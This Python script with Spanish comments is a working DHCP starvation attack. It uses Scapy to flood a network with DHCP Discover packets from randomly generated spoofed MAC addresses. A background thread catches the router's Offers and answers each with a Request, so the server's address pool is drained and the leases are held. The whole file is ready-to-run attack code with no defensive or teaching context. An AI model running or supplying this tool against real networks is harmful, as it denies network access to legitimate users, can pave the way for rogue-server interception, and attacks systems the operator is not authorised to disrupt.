import threading
from scapy.all import sniff, Ether, IP, UDP, BOOTP, DHCP, sendp, RandMAC, RandInt

INTERFACE = "eth0"
# Diccionario para rastrear qué MAC generó qué ID de transacción (XID)
xid_mac_map = {}

def enviar_discovers(limite=500):
    """Inyecta ráfagas de DHCP Discover con MACs aleatorias."""
    print(f"[*] Iniciando inundación de DHCP Discovers en {INTERFACE}...")
    for i in range(limite):
        mac_falsa = RandMAC()
        xid_falso = RandInt()
        
        # Guardamos la relación para cuando el router responda
        xid_mac_map[int(xid_falso)] = mac_falsa

        discover = (
            Ether(src=mac_falsa, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(op=1, xid=xid_falso, chaddr=mac_falsa) /
            DHCP(options=[("message-type", "discover"), "end"])
        )
        sendp(discover, iface=INTERFACE, verbose=False)
        
        if (i + 1) % 50 == 0:
            print(f"[>] {i + 1} Discovers inyectados...")

def procesar_ofertas(paquete):
    """Escucha DHCP Offers del router y responde con DHCP Requests."""
    if not paquete.haslayer(DHCP):
        return

    tipo_mensaje = paquete[DHCP].options[0][1]
    
    # Si el router nos envía un OFFER (tipo 2)
    if tipo_mensaje == 2:
        xid = paquete[BOOTP].xid
        ip_ofrecida = paquete[BOOTP].yiaddr
        server_ip = paquete[IP].src

        # Buscamos la MAC original que generó esta transacción
        mac_falsa = xid_mac_map.get(xid, paquete[Ether].dst)

        print(f"[+] ¡Offer detectado! IP: {ip_ofrecida}. Confirmando reserva...")

        # Construimos el REQUEST para consolidar el agotamiento
        request = (
            Ether(src=mac_falsa, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(op=1, xid=xid, chaddr=mac_falsa) /
            DHCP(options=[
                ("message-type", "request"),
                ("server_id", server_ip),
                ("requested_addr", ip_ofrecida),
                "end"
            ])
        )
        sendp(request, iface=INTERFACE, verbose=False)

def iniciar_escucha():
    # Filtramos solo tráfico DHCP que venga desde el servidor (puerto 68 de destino)
    sniff(filter="udp port 68", prn=procesar_ofertas, iface=INTERFACE, store=0)

if __name__ == "__main__":
    # 1. Iniciamos la escucha de ofertas en un hilo de fondo
    hilo_escucha = threading.Thread(target=iniciar_escucha, daemon=True)
    hilo_escucha.start()

    # 2. Ejecutamos el envío masivo en el hilo principal
    enviar_discovers(limite=300)
    
    print("[*] Inundación completada. Manteniendo escucha para bloquear respuestas tardías...")
    # Dejamos el programa corriendo para asegurar los amarres de IP
    hilo_escucha.join()